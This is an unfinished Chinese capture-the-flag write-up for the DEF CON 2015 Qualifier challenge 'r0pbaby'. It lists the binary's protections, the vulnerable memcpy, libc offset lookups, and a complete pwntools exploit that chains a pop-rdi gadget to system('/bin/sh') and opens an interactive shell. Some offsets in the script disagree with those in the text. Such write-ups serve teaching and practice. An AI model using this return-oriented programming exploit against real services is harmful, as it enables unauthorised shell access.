# Defcon 2015 Qualifier - r0pbaby
[x]未完成
## peda - checksec

```bash
CANARY    : disabled
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : disabled
```
## 漏洞代码

```c
memcpy(&savedregs, nptr, v8);
```

## 解题步骤

* ldd 查看文件所需的动态链接库

```bash
ldd r0pbaby
```
* 使用`strings`查看`/bin/sh`在`libc`里的偏移

```bash
strings -tx /lib/x86_64-linux-gnu/libc.so.6| grep "/bin/sh"
```
-t 参数显示偏移，x表示偏移的进制格式为16进制，我得到的结果是` 180503 /bin/sh`

* 获取system函数地址

r0pbaby的第二个功能可以帮我们获取system函数的地址，我们可以得到`Symbol system: 0x00007F56F7F4D590`

## 构造exp

```python
system = 0x00007FFFF784F390 #get_libc_base()
rdi_gadget_offset = 0x21102
bin_sh_offset = 0x18c177
system_offset = 0x45390
from pwn import *
debug =1
if debug ==1:
  io = process("./r0pbaby")
else:
  io = remote("127.0.0.1",10002)
  #db.attach(io)
system = 0x00007FFFF784F390#get_libc_base()
rdi_gadget_offset = 0x21102
bin_sh_offset = 0x18c177
system_offset = 0x45390
libc_base = system - system_offset # system addr - system_offset = libc_base
print "[+] libc base: [%x]" % libc_base
rdi_gadget_addr = libc_base + rdi_gadget_offset
print "[+] RDI gadget addr: [%x]" % rdi_gadget_addr
bin_sh_addr = libc_base + bin_sh_offset
print "[+] \"/bin/sh\" addr: [%x]" % bin_sh_addr
system_addr = 0x00007FFFF784F390#get_libc_func_addr(h, "system")
print "[+] system addr: [%x]" % system_addr
payload = "A"*8
payload += p64(rdi_gadget_addr)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
io.recv(1024)
io.sendline("3")
io.recv(1024)
io.send("%d\n"%(len(payload)+1))
io.sendline(payload)
io.sendline("4")
io.interactive()
```
